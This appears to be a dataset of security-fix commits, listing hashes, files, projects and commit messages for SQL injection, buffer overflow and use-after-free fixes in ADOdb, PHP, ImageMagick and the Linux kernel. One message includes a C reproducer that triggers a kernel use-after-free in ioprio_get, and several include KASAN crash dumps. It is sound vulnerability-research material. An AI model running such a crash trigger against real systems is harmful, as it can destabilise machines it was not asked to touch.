    63a3e6e04e1839e8f478bbe02186ca48c98c068f
Blob(s) Before Fix: 
    63a3e6e04e1839e8f478bbe02186ca48c98c068f
Projects:
    10n_ADOdb
Commit Message for bd9eca9f40220f9918ec3cc7ae9ef422b3e448b8:
PDO: fix incorrect quoting allowing SQL injection\n\nThe PDO driver was relying on ADOConnection::qstr() for quoting strings. An application relying on qstr() to manually prepare SQL statements rather than using parameterized queries may be vulnerable to SQL injection attacks, as demonstrated by @jdavidlists.\n\nThis commit delegates string quoting to PDO::quote() when a connection is available. If not, it simply replaces single quotes by the value of $replaceQuote property.\n\nFixes #226

======================================================================
Commit With Fix: 
    28f80baf3c53e267c9ce46a2a0fadbb981585132
File(s) In Commit: 
    ext/mysqlnd/mysqlnd_wireprotocol.c
Blob(s) In Commit: 
    855a25cea1c0b50b535f51e57c7b50eab915c2f7
Blob(s) Before Fix: 
    855a25cea1c0b50b535f51e57c7b50eab915c2f7
Projects:
    0014593_php-src
Commit Message for 28f80baf3c53e267c9ce46a2a0fadbb981585132:
Fix bug #72293 - Heap overflow in mysqlnd related to BIT fields

======================================================================
Commit With Fix: 
    6d55ba265637d6adf0ba7e9c9ef11187d1ec2f5b
File(s) In Commit: 
    ext/intl/msgformat/msgformat_format.c
Blob(s) In Commit: 
    9b6df38ee398951292c2d85f4cdc2bca0545f475
Blob(s) Before Fix: 
    9b6df38ee398951292c2d85f4cdc2bca0545f475
Projects:
    0014593_php-src
Commit Message for 6d55ba265637d6adf0ba7e9c9ef11187d1ec2f5b:
Fix bug #73007: add locale length check

======================================================================
Commit With Fix: 
    6933d27afe518967bd1b60e6a7eacd88288929fc
File(s) In Commit: 
    js/vendor/owncloud/share.js
Blob(s) In Commit: 
    2569f5b6c922d56bc8a85f01d4370fb004e46d15
Blob(s) Before Fix: 
    2569f5b6c922d56bc8a85f01d4370fb004e46d15
Projects:
    0xb0ba_gallery
Commit Message for 6933d27afe518967bd1b60e6a7eacd88288929fc:
Add more escaping\n\nEscape folder names in share.js

======================================================================
Commit With Fix: 
    7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
File(s) In Commit: 
    drivers/scsi/arcmsr/arcmsr_hba.c
Blob(s) In Commit: 
    110eca9eaca05c7c5400aa67e2832dceaa04b7db
Blob(s) Before Fix: 
    110eca9eaca05c7c5400aa67e2832dceaa04b7db
Projects:
    0-T-0_ps4-linux
Commit Message for 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167:
scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()\n\nWe need to put an upper bound on "user_len" so the memcpy() doesn't overflow.\n\nCc: <stable@vger.kernel.org> Reported-by: Marco Grassi <marco.gra@gmail.com> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Reviewed-by: Tomas Henzl <thenzl@redhat.com> Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

======================================================================
Commit With Fix: 
    c1092f167cc6c78dc8bf9bf149946c5219413df3
File(s) In Commit: 
    framework/modules/pixidou/controllers/pixidouController.php
Blob(s) In Commit: 
    14afb2284a05f677efb5f691da9cef5b28f04984
Blob(s) Before Fix: 
    14afb2284a05f677efb5f691da9cef5b28f04984
Projects:
    nwtn_exponent-cms
Commit Message for c1092f167cc6c78dc8bf9bf149946c5219413df3:
security fix to pixidou editor

======================================================================
Commit With Fix: 
    c1092f167cc6c78dc8bf9bf149946c5219413df3
File(s) In Commit: 
    framework/modules/pixidou/controllers/pixidouController.php
Blob(s) In Commit: 
    14afb2284a05f677efb5f691da9cef5b28f04984
Blob(s) Before Fix: 
    14afb2284a05f677efb5f691da9cef5b28f04984
Projects:
    nwtn_exponent-cms
Commit Message for c1092f167cc6c78dc8bf9bf149946c5219413df3:
security fix to pixidou editor

======================================================================
Commit With Fix: 
    a54fe0e8600eaf3dc6fe717d3c0398001507f723
File(s) In Commit: 
    magick/cache.c
Blob(s) In Commit: 
    369c52caff1795ac3140634ef1ee0f99e4f8836f
Blob(s) Before Fix: 
    369c52caff1795ac3140634ef1ee0f99e4f8836f
Projects:
    2016repotsheyue_ImageMagick
Commit Message for a54fe0e8600eaf3dc6fe717d3c0398001507f723:


======================================================================
Commit With Fix: 
    2ad6d33493750a28a5a655d319a8e0b16c392de1
File(s) In Commit: 
    coders/rle.c
Blob(s) In Commit: 
    9809fa7f29935efe336541ae873394b3b2188ece
Blob(s) Before Fix: 
    9809fa7f29935efe336541ae873394b3b2188ece
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 2ad6d33493750a28a5a655d319a8e0b16c392de1:
Fixed check for the number of pixels that will be allocated.

======================================================================
Commit With Fix: 
    14e606db148d6ebcaae20f1e1d6d71903ca4a556
File(s) In Commit: 
    coders/hdr.c
Blob(s) In Commit: 
    bdb343b1195d9be4cf059c809652fa25cbe84236
Blob(s) Before Fix: 
    bdb343b1195d9be4cf059c809652fa25cbe84236
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 14e606db148d6ebcaae20f1e1d6d71903ca4a556:
https://bugs.launchpad.net/ubuntu/+source/imagemagick/+bug/1537213

======================================================================
Commit With Fix: 
    30eec879c8b446b0ea9a3bb0da1a441cc8482bc4
File(s) In Commit: 
    coders/psd.c
Blob(s) In Commit: 
    9f69d8a7123344418bee4b1c2827ef4f0088d0ee
Blob(s) Before Fix: 
    9f69d8a7123344418bee4b1c2827ef4f0088d0ee
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 30eec879c8b446b0ea9a3bb0da1a441cc8482bc4:
Moved check for https://github.com/ImageMagick/ImageMagick/issues/92.

======================================================================
Commit With Fix: 
    4b1b9c0522628887195bad3a6723f7000b0c9a58
File(s) In Commit: 
    coders/psd.c
Blob(s) In Commit: 
    47c6bcf735ca86c035240dbb25a741ef3fbc0cea
Blob(s) Before Fix: 
    47c6bcf735ca86c035240dbb25a741ef3fbc0cea
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 4b1b9c0522628887195bad3a6723f7000b0c9a58:
Added extra check to fix https://github.com/ImageMagick/ImageMagick/issues/93

======================================================================
Commit With Fix: 
    5f16640725b1225e6337c62526e6577f0f88edb8
File(s) In Commit: 
    coders/psd.c
Blob(s) In Commit: 
    d8fd9503113ba75c208bbbaa6f56d0eb39c34db3
Blob(s) Before Fix: 
    d8fd9503113ba75c208bbbaa6f56d0eb39c34db3
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 5f16640725b1225e6337c62526e6577f0f88edb8:
Fixed head buffer overflow reported in: https://github.com/ImageMagick/ImageMagick/issues/98

======================================================================
Commit With Fix: 
    a2e1064f288a353bc5fef7f79ccb7683759e775c
File(s) In Commit: 
    coders/xcf.c
Blob(s) In Commit: 
    b8075bb682389650c8d2677f90fff10d1f46bf2c
Blob(s) Before Fix: 
    b8075bb682389650c8d2677f90fff10d1f46bf2c
Projects:
    2016repotsheyue_ImageMagick
Commit Message for a2e1064f288a353bc5fef7f79ccb7683759e775c:
https://github.com/ImageMagick/ImageMagick/issues/104

======================================================================
Commit With Fix: 
    4f2c04ea6673863b87ac7f186cbb0d911f74085c
File(s) In Commit: 
    coders/psd.c
Blob(s) In Commit: 
    ba9bbba660e6f2ef1c9ef5525f1933d03dc7a8a0
Blob(s) Before Fix: 
    ba9bbba660e6f2ef1c9ef5525f1933d03dc7a8a0
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 4f2c04ea6673863b87ac7f186cbb0d911f74085c:
Added check for out of bounds read (https://github.com/ImageMagick/ImageMagick/issues/108).

======================================================================
Commit With Fix: 
    bef1e4f637d8f665bc133a9c6d30df08d983bc3a
File(s) In Commit: 
    coders/wpg.c
Blob(s) In Commit: 
    b01dcf9cc63aba8cd8137ab71fa15b2e256fd727
Blob(s) Before Fix: 
    b01dcf9cc63aba8cd8137ab71fa15b2e256fd727
Projects:
    2016repotsheyue_ImageMagick
Commit Message for bef1e4f637d8f665bc133a9c6d30df08d983bc3a:
https://github.com/ImageMagick/ImageMagick/issues/120

======================================================================
Commit With Fix: 
    82e2049862a8b8a999e160734ad64fb6cc3b145f
File(s) In Commit: 
    coders/psd.c
Blob(s) In Commit: 
    1f63ec79eb2cb51a0653e568fada1c053c9b1f15
Blob(s) Before Fix: 
    1f63ec79eb2cb51a0653e568fada1c053c9b1f15
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 82e2049862a8b8a999e160734ad64fb6cc3b145f:
https://github.com/ImageMagick/ImageMagick/issues/148

======================================================================
Commit With Fix: 
    4e81ce8b07219c69a9aeccb0f7f7b927ca6db74c
File(s) In Commit: 
    magick/cache.c
Blob(s) In Commit: 
    0e4e482f8d7fd92ebcc3d2e34f70d15b52acf121
Blob(s) Before Fix: 
    0e4e482f8d7fd92ebcc3d2e34f70d15b52acf121
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 4e81ce8b07219c69a9aeccb0f7f7b927ca6db74c:
http://www.imagemagick.org/discourse-server/viewtopic.php?f=2&t=28946

======================================================================
Commit With Fix: 
    a0108a892f9ea3c2bb1e7a49b7d71376c2ecbff7
File(s) In Commit: 
    coders/rgf.c
Blob(s) In Commit: 
    e572f96d2441183b2e45850a6f8096f4ab2cc2b3
Blob(s) Before Fix: 
    e572f96d2441183b2e45850a6f8096f4ab2cc2b3
Projects:
    2016repotsheyue_ImageMagick
Commit Message for a0108a892f9ea3c2bb1e7a49b7d71376c2ecbff7:
Fix abort when writing to rgf format\n\nThe rgf format (LEGO MINDSTORMS EV3 images) caused a software abort because exception == NULL. When WriteRGFImage is called from WriteImage, it is only passed two parameters, not three. So, removed the extra parameter and use image->exception instead as in other coders.

======================================================================
Commit With Fix: 
    acca96a135a4d2a028ba9b636886af99c0915379
File(s) In Commit: 
    policycoreutils/sandbox/sandbox
Blob(s) In Commit: 
    07c340cc4d1e932f29c7cf79e020fa262b62aa77
Blob(s) Before Fix: 
    07c340cc4d1e932f29c7cf79e020fa262b62aa77
Projects:
    0-T-0_ps4-linux
    0-kaladin_build
    0-kaladin_system_core
    00day0_android_frameworks_base
Commit Message for acca96a135a4d2a028ba9b636886af99c0915379:
sandbox: create a new session for sandboxed processes\n\nIt helps to prevent sandboxed processes to inject arbitrary commands into the parent.\n\nSigned-off-by: Petr Lautrbach <plautrba@redhat.com>

======================================================================
Commit With Fix: 
    f1b1eb154baa684fad5d65bf4dff79c8ded8b65a
File(s) In Commit: 
    scripts/buf.pl
Blob(s) In Commit: 
    6d907f127188e21322cd4deb220ed0b20cc79b25
Blob(s) Before Fix: 
    6d907f127188e21322cd4deb220ed0b20cc79b25
Projects:
    Astalaseven_scripts.irssi.org
Commit Message for f1b1eb154baa684fad5d65bf4dff79c8ded8b65a:
Fix disclosure via filesystem\n\nbuf.pl restores the scrollbuffer between "/upgrade"s by writing the contents to a file, and reading that after the new process was spawned. Through that file, the contents of (private) chat conversations may leak to other users.\n\nCareful users with a limited umask (e.g. 077) are not affected by this bug. However, most Linux systems default to a umask of 022, meaning that files written without further restricting the permissions, are readable by any user.\n\nThis patch sets a safer umask of 077 for the scrollbuffer dump, and will remove the temporary file after use to further reduce the attack surface. Additionally, it will remove any remaining temporary scrollbuffer file left in place, like those written by previous versions of the script.

======================================================================
Commit With Fix: 
    4ae457ff1bf80e8b61286cd125ca794b25564e86
File(s) In Commit: 
    install/index.php
Blob(s) In Commit: 
    0e440ab2d754eb0a52c14bac369be955e8f507a4
Blob(s) Before Fix: 
    0e440ab2d754eb0a52c14bac369be955e8f507a4
Projects:
    nwtn_exponent-cms
Commit Message for 4ae457ff1bf80e8b61286cd125ca794b25564e86:
security fix to prevent possible hacking by moving security checks earlier in the install code

======================================================================
Commit With Fix: 
    5ec24a2642bd0854b884d1a9b51d12371373b410
File(s) In Commit: 
    lrmd/tls_backend.c
Blob(s) In Commit: 
    0e0782869a9068d72fc1609cc2bfab3da39041c1
Blob(s) Before Fix: 
    0e0782869a9068d72fc1609cc2bfab3da39041c1
Projects:
    359887612_pacemaker
Commit Message for 5ec24a2642bd0854b884d1a9b51d12371373b410:
Fix: remote: cl#5269 - Notify other clients of a new connection only if the handshake has completed (bsc#967388)

======================================================================
Commit With Fix: 
    a7bb158b7bedd1449a34432feb3a67c8f1873bfa
File(s) In Commit: 
    MagickCore/profile.c
Blob(s) In Commit: 
    4239d558c6e377159779e5fa927b5e8249abc44e
Blob(s) Before Fix: 
    4239d558c6e377159779e5fa927b5e8249abc44e
Projects:
    2016repotsheyue_ImageMagick
Commit Message for a7bb158b7bedd1449a34432feb3a67c8f1873bfa:
https://github.com/ImageMagick/ImageMagick/issues/280

======================================================================
Commit With Fix: 
    bb454857348245a7397f9e4fbb3a902f4ac25913
File(s) In Commit: 
    src/updatedownloader.cpp
Blob(s) In Commit: 
    b6893305a82934c8272fec3ab6db1897d00a7a08
Blob(s) Before Fix: 
    b6893305a82934c8272fec3ab6db1897d00a7a08
Projects:
    57-Wolve_winsparkle
Commit Message for bb454857348245a7397f9e4fbb3a902f4ac25913:
Verify UpdateTempDir isn't maliciously modified\n\nDon't just delete the stored updates temporary directory on launch, but validate the registry key to ensure it is in an expected location and follows WinSparkle's naming convention. This is to prevent malicious users from modifying this registry key and forcing the host app to delete arbitrary directories (a user being able to delete the key would be able to delete the directory themselves, so it's not a serious issue, but it nevertheless is bad behavior and shouldn't be possible).

======================================================================
Commit With Fix: 
    90406972f108c4da71f998601b06abdc2ac6f06e
File(s) In Commit: 
    MagickCore/attribute.c
Blob(s) In Commit: 
    f6510b7bf318451a4a2326632aead2a9c53f7747
Blob(s) Before Fix: 
    f6510b7bf318451a4a2326632aead2a9c53f7747
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 90406972f108c4da71f998601b06abdc2ac6f06e:
https://github.com/ImageMagick/ImageMagick/issues/281

======================================================================
Commit With Fix: 
    77da160530dd1dc94f6ae15a981f24e5f0021e84
File(s) In Commit: 
    block/genhd.c
Blob(s) In Commit: 
    0ad879655f825789934609f45cb7d1e9840bcc78
Blob(s) Before Fix: 
    0ad879655f825789934609f45cb7d1e9840bcc78
Projects:
    0-T-0_ps4-linux
Commit Message for 77da160530dd1dc94f6ae15a981f24e5f0021e84:
block: fix use-after-free in seq file\n\nI got a KASAN report of use-after-free:\n\n    ==================================================================     BUG: KASAN: use-after-free in klist_iter_exit+0x61/0x70 at addr ffff8800b6581508     Read of size 8 by task trinity-c1/315     =============================================================================     BUG kmalloc-32 (Not tainted): kasan: bad access detected     -----------------------------------------------------------------------------\n\n    Disabling lock debugging due to kernel taint     INFO: Allocated in disk_seqf_start+0x66/0x110 age=144 cpu=1 pid=315             ___slab_alloc+0x4f1/0x520             __slab_alloc.isra.58+0x56/0x80             kmem_cache_alloc_trace+0x260/0x2a0             disk_seqf_start+0x66/0x110             traverse+0x176/0x860             seq_read+0x7e3/0x11a0             proc_reg_read+0xbc/0x180             do_loop_readv_writev+0x134/0x210             do_readv_writev+0x565/0x660             vfs_readv+0x67/0xa0             do_preadv+0x126/0x170             SyS_preadv+0xc/0x10             do_syscall_64+0x1a1/0x460             return_from_SYSCALL_64+0x0/0x6a     INFO: Freed in disk_seqf_stop+0x42/0x50 age=160 cpu=1 pid=315             __slab_free+0x17a/0x2c0             kfree+0x20a/0x220             disk_seqf_stop+0x42/0x50             traverse+0x3b5/0x860             seq_read+0x7e3/0x11a0             proc_reg_read+0xbc/0x180             do_loop_readv_writev+0x134/0x210             do_readv_writev+0x565/0x660             vfs_readv+0x67/0xa0             do_preadv+0x126/0x170             SyS_preadv+0xc/0x10             do_syscall_64+0x1a1/0x460             return_from_SYSCALL_64+0x0/0x6a\n\n    CPU: 1 PID: 315 Comm: trinity-c1 Tainted: G    B           4.7.0+ #62     Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014      ffffea0002d96000 ffff880119b9f918 ffffffff81d6ce81 ffff88011a804480      ffff8800b6581500 ffff880119b9f948 ffffffff8146c7bd ffff88011a804480      ffffea0002d96000 ffff8800b6581500 fffffffffffffff4 ffff880119b9f970     Call Trace:      [<ffffffff81d6ce81>] dump_stack+0x65/0x84      [<ffffffff8146c7bd>] print_trailer+0x10d/0x1a0      [<ffffffff814704ff>] object_err+0x2f/0x40      [<ffffffff814754d1>] kasan_report_error+0x221/0x520      [<ffffffff8147590e>] __asan_report_load8_noabort+0x3e/0x40      [<ffffffff83888161>] klist_iter_exit+0x61/0x70      [<ffffffff82404389>] class_dev_iter_exit+0x9/0x10      [<ffffffff81d2e8ea>] disk_seqf_stop+0x3a/0x50      [<ffffffff8151f812>] seq_read+0x4b2/0x11a0      [<ffffffff815f8fdc>] proc_reg_read+0xbc/0x180      [<ffffffff814b24e4>] do_loop_readv_writev+0x134/0x210      [<ffffffff814b4c45>] do_readv_writev+0x565/0x660      [<ffffffff814b8a17>] vfs_readv+0x67/0xa0      [<ffffffff814b8de6>] do_preadv+0x126/0x170      [<ffffffff814b92ec>] SyS_preadv+0xc/0x10\n\nThis problem can occur in the following situation:\n\nopen()  - pread()     - .seq_start()        - iter = kmalloc() // succeeds        - seqf->private = iter     - .seq_stop()        - kfree(seqf->private)  - pread()     - .seq_start()        - iter = kmalloc() // fails     - .seq_stop()        - class_dev_iter_exit(seqf->private) // boom! old pointer\n\nAs the comment in disk_seqf_stop() says, stop is called even if start failed, so we need to reinitialise the private pointer to NULL when seq iteration stops.\n\nAn alternative would be to set the private pointer to NULL when the kmalloc() in disk_seqf_start() fails.\n\nCc: stable@vger.kernel.org Signed-off-by: Vegard Nossum <vegard.nossum@oracle.com> Acked-by: Tejun Heo <tj@kernel.org> Signed-off-by: Jens Axboe <axboe@fb.com>

======================================================================
Commit With Fix: 
    8ba8682107ee2ca3347354e018865d8e1967c5f4
File(s) In Commit: 
    block/ioprio.c
Blob(s) In Commit: 
    01b8116298a13b5463e7969ce66c0b037bcfccd5
Blob(s) Before Fix: 
    01b8116298a13b5463e7969ce66c0b037bcfccd5
Projects:
    0-T-0_ps4-linux
Commit Message for 8ba8682107ee2ca3347354e018865d8e1967c5f4:
block: fix use-after-free in sys_ioprio_get()\n\nget_task_ioprio() accesses the task->io_context without holding the task lock and thus can race with exit_io_context(), leading to a use-after-free. The reproducer below hits this within a few seconds on my 4-core QEMU VM:\n\n#define _GNU_SOURCE #include <assert.h> #include <unistd.h> #include <sys/syscall.h> #include <sys/wait.h>\n\nint main(int argc, char **argv) { 	pid_t pid, child  	long nproc, i \n\n	/* ioprio_set(IOPRIO_WHO_PROCESS, 0, IOPRIO_PRIO_VALUE(IOPRIO_CLASS_IDLE, 0))  */ 	syscall(SYS_ioprio_set, 1, 0, 0x6000) \n\n	nproc = sysconf(_SC_NPROCESSORS_ONLN) \n\n	for (i = 0  i < nproc  i++) { 		pid = fork()  		assert(pid != -1)  		if (pid == 0) { 			for (  ) { 				pid = fork()  				assert(pid != -1)  				if (pid == 0) { 					_exit(0)  				} else { 					child = wait(NULL)  					assert(child == pid)  				} 			} 		}\n\n		pid = fork()  		assert(pid != -1)  		if (pid == 0) { 			for (  ) { 				/* ioprio_get(IOPRIO_WHO_PGRP, 0)  */ 				syscall(SYS_ioprio_get, 2, 0)  			} 		} 	}\n\n	for (  ) { 		/* ioprio_get(IOPRIO_WHO_PGRP, 0)  */ 		syscall(SYS_ioprio_get, 2, 0)  	}\n\n	return 0  }\n\nThis gets us KASAN dumps like this:\n\n[   35.526914] ================================================================== [   35.530009] BUG: KASAN: out-of-bounds in get_task_ioprio+0x7b/0x90 at addr ffff880066f34e6c [   35.530009] Read of size 2 by task ioprio-gpf/363 [   35.530009] ============================================================================= [   35.530009] BUG blkdev_ioc (Not tainted): kasan: bad access detected [   35.530009] -----------------------------------------------------------------------------\n\n[   35.530009] Disabling lock debugging due to kernel taint [   35.530009] INFO: Allocated in create_task_io_context+0x2b/0x370 age=0 cpu=0 pid=360 [   35.530009] 	___slab_alloc+0x55d/0x5a0 [   35.530009] 	__slab_alloc.isra.20+0x2b/0x40 [   35.530009] 	kmem_cache_alloc_node+0x84/0x200 [   35.530009] 	create_task_io_context+0x2b/0x370 [   35.530009] 	get_task_io_context+0x92/0xb0 [   35.530009] 	copy_process.part.8+0x5029/0x5660 [   35.530009] 	_do_fork+0x155/0x7e0 [   35.530009] 	SyS_clone+0x19/0x20 [   35.530009] 	do_syscall_64+0x195/0x3a0 [   35.530009] 	return_from_SYSCALL_64+0x0/0x6a [   35.530009] INFO: Freed in put_io_context+0xe7/0x120 age=0 cpu=0 pid=1060 [   35.530009] 	__slab_free+0x27b/0x3d0 [   35.530009] 	kmem_cache_free+0x1fb/0x220 [   35.530009] 	put_io_context+0xe7/0x120 [   35.530009] 	put_io_context_active+0x238/0x380 [   35.530009] 	exit_io_context+0x66/0x80 [   35.530009] 	do_exit+0x158e/0x2b90 [   35.530009] 	do_group_exit+0xe5/0x2b0 [   35.530009] 	SyS_exit_group+0x1d/0x20 [   35.530009] 	entry_SYSCALL_64_fastpath+0x1a/0xa4 [   35.530009] INFO: Slab 0xffffea00019bcd00 objects=20 used=4 fp=0xffff880066f34ff0 flags=0x1fffe0000004080 [   35.530009] INFO: Object 0xffff880066f34e58 @offset=3672 fp=0x0000000000000001 [   35.530009] ==================================================================\n\nFix it by grabbing the task lock while we poke at the io_context.\n\nCc: stable@vger.kernel.org Reported-by: Dmitry Vyukov <dvyukov@google.com> Signed-off-by: Omar Sandoval <osandov@fb.com> Signed-off-by: Jens Axboe <axboe@fb.com>

======================================================================
Commit With Fix: 
    38740a5b87d53ceb89eb2c970150f6e94e00373a
File(s) In Commit: 
    drivers/usb/gadget/function/f_fs.c
Blob(s) In Commit: 
    15b648cbc75c4141bb5c51bd03c2c6e5b5f6c821
Blob(s) Before Fix: 
    15b648cbc75c4141bb5c51bd03c2c6e5b5f6c821
Projects:
    0-T-0_ps4-linux
Commit Message for 38740a5b87d53ceb89eb2c970150f6e94e00373a:
usb: gadget: f_fs: Fix use-after-free\n\nWhen using asynchronous read or write operations on the USB endpoints the issuer of the IO request is notified by calling the ki_complete() callback of the submitted kiocb when the URB has been completed.\n\nCalling this ki_complete() callback will free kiocb. Make sure that the structure is no longer accessed beyond that point, otherwise undefined behaviour might occur.\n\nFixes: 2e4c7553cd6f ("usb: gadget: f_fs: add aio support") Cc: <stable@vger.kernel.org> # v3.15+ Signed-off-by: Lars-Peter Clausen <lars@metafoo.de> Signed-off-by: Felipe Balbi <felipe.balbi@linux.intel.com>

======================================================================
Commit With Fix: 
    8dfbcc4351a0b6d2f2d77f367552f48ffefafe18
File(s) In Commit: 
    drivers/media/tuners/tuner-xc2028.c
Blob(s) In Commit: 
    082ff5608455c273ea9c53e1824bbb76fad15a0e
Blob(s) Before Fix: 
    082ff5608455c273ea9c53e1824bbb76fad15a0e
Projects:
    0-T-0_ps4-linux
Commit Message for 8dfbcc4351a0b6d2f2d77f367552f48ffefafe18:
[media] xc2028: avoid use after free\n\nIf struct xc2028_config is passed without a firmware name, the following trouble may happen:\n\n[11009.907205] xc2028 5-0061: type set to XCeive xc2028/xc3028 tuner [11009.907491] ================================================================== [11009.907750] BUG: KASAN: use-after-free in strcmp+0x96/0xb0 at addr ffff8803bd78ab40 [11009.907992] Read of size 1 by task modprobe/28992 [11009.907994] ============================================================================= [11009.907997] BUG kmalloc-16 (Tainted: G        W      ): kasan: bad access detected [11009.907999] -----------------------------------------------------------------------------\n\n[11009.908008] INFO: Allocated in xhci_urb_enqueue+0x214/0x14c0 [xhci_hcd] age=0 cpu=3 pid=28992 [11009.908012] 	___slab_alloc+0x581/0x5b0 [11009.908014] 	__slab_alloc+0x51/0x90 [11009.908017] 	__kmalloc+0x27b/0x350 [11009.908022] 	xhci_urb_enqueue+0x214/0x14c0 [xhci_hcd] [11009.908026] 	usb_hcd_submit_urb+0x1e8/0x1c60 [11009.908029] 	usb_submit_urb+0xb0e/0x1200 [11009.908032] 	usb_serial_generic_write_start+0xb6/0x4c0 [11009.908035] 	usb_serial_generic_write+0x92/0xc0 [11009.908039] 	usb_console_write+0x38a/0x560 [11009.908045] 	call_console_drivers.constprop.14+0x1ee/0x2c0 [11009.908051] 	console_unlock+0x40d/0x900 [11009.908056] 	vprintk_emit+0x4b4/0x830 [11009.908061] 	vprintk_default+0x1f/0x30 [11009.908064] 	printk+0x99/0xb5 [11009.908067] 	kasan_report_error+0x10a/0x550 [11009.908070] 	__asan_report_load1_noabort+0x43/0x50 [11009.908074] INFO: Freed in xc2028_set_config+0x90/0x630 [tuner_xc2028] age=1 cpu=3 pid=28992 [11009.908077] 	__slab_free+0x2ec/0x460 [11009.908080] 	kfree+0x266/0x280 [11009.908083] 	xc2028_set_config+0x90/0x630 [tuner_xc2028] [11009.908086] 	xc2028_attach+0x310/0x8a0 [tuner_xc2028] [11009.908090] 	em28xx_attach_xc3028.constprop.7+0x1f9/0x30d [em28xx_dvb] [11009.908094] 	em28xx_dvb_init.part.3+0x8e4/0x5cf4 [em28xx_dvb] [11009.908098] 	em28xx_dvb_init+0x81/0x8a [em28xx_dvb] [11009.908101] 	em28xx_register_extension+0xd9/0x190 [em28xx] [11009.908105] 	em28xx_dvb_register+0x10/0x1000 [em28xx_dvb] [11009.908108] 	do_one_initcall+0x141/0x300 [11009.908111] 	do_init_module+0x1d0/0x5ad [11009.908114] 	load_module+0x6666/0x9ba0 [11009.908117] 	SyS_finit_module+0x108/0x130 [11009.908120] 	entry_SYSCALL_64_fastpath+0x16/0x76 [11009.908123] INFO: Slab 0xffffea000ef5e280 objects=25 used=25 fp=0x          (null) flags=0x2ffff8000004080 [11009.908126] INFO: Object 0xffff8803bd78ab40 @offset=2880 fp=0x0000000000000001\n\n[11009.908130] Bytes b4 ffff8803bd78ab30: 01 00 00 00 2a 07 00 00 9d 28 00 00 01 00 00 00  ....*....(...... [11009.908133] Object ffff8803bd78ab40: 01 00 00 00 00 00 00 00 b0 1d c3 6a 00 88 ff ff  ...........j.... [11009.908137] CPU: 3 PID: 28992 Comm: modprobe Tainted: G    B   W       4.5.0-rc1+ #43 [11009.908140] Hardware name:                  /NUC5i7RYB, BIOS RYBDWi35.86A.0350.2015.0812.1722 08/12/2015 [11009.908142]  ffff8803bd78a000 ffff8802c273f1b8 ffffffff81932007 ffff8803c6407a80 [11009.908148]  ffff8802c273f1e8 ffffffff81556759 ffff8803c6407a80 ffffea000ef5e280 [11009.908153]  ffff8803bd78ab40 dffffc0000000000 ffff8802c273f210 ffffffff8155ccb4 [11009.908158] Call Trace: [11009.908162]  [<ffffffff81932007>] dump_stack+0x4b/0x64 [11009.908165]  [<ffffffff81556759>] print_trailer+0xf9/0x150 [11009.908168]  [<ffffffff8155ccb4>] object_err+0x34/0x40 [11009.908171]  [<ffffffff8155f260>] kasan_report_error+0x230/0x550 [11009.908175]  [<ffffffff81237d71>] ? trace_hardirqs_off_caller+0x21/0x290 [11009.908179]  [<ffffffff8155e926>] ? kasan_unpoison_shadow+0x36/0x50 [11009.908182]  [<ffffffff8155f5c3>] __asan_report_load1_noabort+0x43/0x50 [11009.908185]  [<ffffffff8155ea00>] ? __asan_register_globals+0x50/0xa0 [11009.908189]  [<ffffffff8194cea6>] ? strcmp+0x96/0xb0 [11009.908192]  [<ffffffff8194cea6>] strcmp+0x96/0xb0 [11009.908196]  [<ffffffffa13ba4ac>] xc2028_set_config+0x15c/0x630 [tuner_xc2028] [11009.908200]  [<ffffffffa13bac90>] xc2028_attach+0x310/0x8a0 [tuner_xc2028] [11009.908203]  [<ffffffff8155ea78>] ? memset+0x28/0x30 [11009.908206]  [<ffffffffa13ba980>] ? xc2028_set_config+0x630/0x630 [tuner_xc2028] [11009.908211]  [<ffffffffa157a59a>] em28xx_attach_xc3028.constprop.7+0x1f9/0x30d [em28xx_dvb] [11009.908215]  [<ffffffffa157aa2a>] ? em28xx_dvb_init.part.3+0x37c/0x5cf4 [em28xx_dvb] [11009.908219]  [<ffffffffa157a3a1>] ? hauppauge_hvr930c_init+0x487/0x487 [em28xx_dvb] [11009.908222]  [<ffffffffa01795ac>] ? lgdt330x_attach+0x1cc/0x370 [lgdt330x] [11009.908226]  [<ffffffffa01793e0>] ? i2c_read_demod_bytes.isra.2+0x210/0x210 [lgdt330x] [11009.908230]  [<ffffffff812e87d0>] ? ref_module.part.15+0x10/0x10 [11009.908233]  [<ffffffff812e56e0>] ? module_assert_mutex_or_preempt+0x80/0x80 [11009.908238]  [<ffffffffa157af92>] em28xx_dvb_init.part.3+0x8e4/0x5cf4 [em28xx_dvb] [11009.908242]  [<ffffffffa157a6ae>] ? em28xx_attach_xc3028.constprop.7+0x30d/0x30d [em28xx_dvb] [11009.908245]  [<ffffffff8195222d>] ? string+0x14d/0x1f0 [11009.908249]  [<ffffffff8195381f>] ? symbol_string+0xff/0x1a0 [11009.908253]  [<ffffffff81953720>] ? uuid_string+0x6f0/0x6f0 [11009.908257]  [<ffffffff811a775e>] ? __kernel_text_address+0x7e/0xa0 [11009.908260]  [<ffffffff8104b02f>] ? print_context_stack+0x7f/0xf0 [11009.908264]  [<ffffffff812e9846>] ? __module_address+0xb6/0x360 [11009.908268]  [<ffffffff8137fdc9>] ? is_ftrace_trampoline+0x99/0xe0 [11009.908271]  [<ffffffff811a775e>] ? __kernel_text_address+0x7e/0xa0 [11009.908275]  [<ffffffff81240a70>] ? debug_check_no_locks_freed+0x290/0x290 [11009.908278]  [<ffffffff8104a24b>] ? dump_trace+0x11b/0x300 [11009.908282]  [<ffffffffa13e8143>] ? em28xx_register_extension+0x23/0x190 [em28xx] [11009.908285]  [<ffffffff81237d71>] ? trace_hardirqs_off_caller+0x21/0x290 [11009.908289]  [<ffffffff8123ff56>] ? trace_hardirqs_on_caller+0x16/0x590 [11009.908292]  [<ffffffff812404dd>] ? trace_hardirqs_on+0xd/0x10 [11009.908296]  